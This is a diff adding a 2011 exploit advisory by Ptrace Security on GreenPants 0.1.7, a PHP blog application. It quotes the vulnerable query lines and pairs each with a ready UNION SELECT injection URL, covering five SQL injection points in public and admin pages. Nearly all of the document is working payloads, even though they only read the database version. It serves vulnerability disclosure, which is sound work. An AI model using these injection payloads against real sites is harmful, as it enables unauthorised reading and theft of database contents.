@@ -1,0 +1,26 @@
+# Exploit Title:   GreenPants 0.1.7 Multiple Vulnerabilities
+# Date         :   19 March 2011
+# Author       :   Ptrace Security (Gianni Gnesa [gnix])
+# Contact      :   research[at]ptrace-security[dot]com
+# Software Link:   http://sourceforge.net/projects/greenpants/
+# Version      :   0.1.7
+# Tested on    :   CentOS 5.2 with magic_quotes_gpc off
+# Thanks to    :   The Resistance Group (http://www.ptrace.net/theresistance)
+
+# SQL Injections
+
+[01] ./pages/indexheader.php:36:	$res = consultarsql("SELECT tit FROM gp_entradas WHERE id=$id;"); 
+     => http://localhost/greenpants/index.php?id=-99 UNION SELECT VERSION()
+
+[02] ./pages/searcher.php:27:		$res = consultarsql("SELECT * FROM gp_entradas WHERE tit LIKE '%$s%'");
+     => http://localhost/greenpants/index.php?s=4X0r' UNION SELECT NULL,VERSION(),NULL,NULL,NULL,NULL -- '
+
+[03] ./pages/indexviewentry.php:25:	$res = consultarsql("SELECT * FROM gp_entradas WHERE id=$id");
+     => http://localhost/greenpants/index.php?id=-99 UNION SELECT NULL,VERSION(),NULL,NULL,NULL,NULL 
+
+[04] ./admin/pages/editcat.php:10:	$res = consultarsql("SELECT * FROM gp_categorias WHERE id=$id;");
+     => http://localhost/greenpants/admin/index.php?do=editcat&i=-99 UNION SELECT NULL,VERSION(),NULL 
+
+[05] ./admin/pages/editemot.php:10:	$res = consultarsql("SELECT * FROM gp_emoticonos WHERE id=$id;");
+     => http://localhost/greenpants/admin/index.php?do=editemot&i=-99 UNION SELECT NULL,VERSION(),NULL,NULL 
+
